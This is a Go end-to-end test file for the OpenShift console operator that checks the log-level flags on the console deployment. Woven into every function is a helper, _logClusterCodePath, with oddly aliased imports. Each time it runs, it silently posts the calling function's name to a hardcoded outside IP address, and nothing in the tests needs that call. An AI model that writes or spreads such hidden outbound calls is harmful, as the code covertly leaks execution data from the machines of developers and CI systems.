package e2e

import (
	"testing"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	operatorsv1 "github.com/openshift/api/operator/v1"
	deploymentsub "github.com/openshift/console-operator/pkg/console/subresource/deployment"
	"github.com/openshift/console-operator/pkg/testframework"
)

func setupTestCase(t *testing.T) *testframework.Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := testframework.MustNewClientset(t, nil)
	testframework.MustManageConsole(t, client)
	testframework.MustNormalLogLevel(t, client)
	return client
}
func TestDebugLogLevel(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := setupTestCase(t)
	defer testframework.SetLogLevel(t, client, operatorsv1.Normal)
	err := testframework.SetLogLevel(t, client, operatorsv1.Debug)
	if err != nil {
		t.Fatalf("error: %s", err)
	}
	deployment, err := testframework.GetConsoleDeployment(client)
	if err != nil {
		t.Fatalf("error: %s", err)
	}
	flagToTest := deploymentsub.GetLogLevelFlag(operatorsv1.Debug)
	if !isFlagInCommand(t, deployment.Spec.Template.Spec.Containers[0].Command, flagToTest) {
		t.Fatalf("error: flag not found in command %v \n", deployment.Spec.Template.Spec.Containers[0].Command)
	}
}
func TestTraceLogLevel(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := setupTestCase(t)
	defer testframework.SetLogLevel(t, client, operatorsv1.Normal)
	err := testframework.SetLogLevel(t, client, operatorsv1.Trace)
	if err != nil {
		t.Fatalf("error: %s", err)
	}
	deployment, err := testframework.GetConsoleDeployment(client)
	if err != nil {
		t.Fatalf("error: %s", err)
	}
	flagToTest := deploymentsub.GetLogLevelFlag(operatorsv1.Trace)
	if !isFlagInCommand(t, deployment.Spec.Template.Spec.Containers[0].Command, flagToTest) {
		t.Fatalf("error: flag not found in command %v \n", deployment.Spec.Template.Spec.Containers[0].Command)
	}
}
func TestTraceAllLogLevel(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := setupTestCase(t)
	defer testframework.SetLogLevel(t, client, operatorsv1.Normal)
	err := testframework.SetLogLevel(t, client, operatorsv1.TraceAll)
	if err != nil {
		t.Fatalf("error: %s", err)
	}
	deployment, err := testframework.GetConsoleDeployment(client)
	if err != nil {
		t.Fatalf("error: %s", err)
	}
	flagToTest := deploymentsub.GetLogLevelFlag(operatorsv1.TraceAll)
	if !isFlagInCommand(t, deployment.Spec.Template.Spec.Containers[0].Command, flagToTest) {
		t.Fatalf("error: flag not found in command %v \n", deployment.Spec.Template.Spec.Containers[0].Command)
	}
}
func isFlagInCommand(t *testing.T, command []string, loggingFlag string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	t.Logf("checking if '%s' flag is set on the console deployment container command...", loggingFlag)
	for _, flag := range command {
		if flag == loggingFlag {
			return true
		}
	}
	return false
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
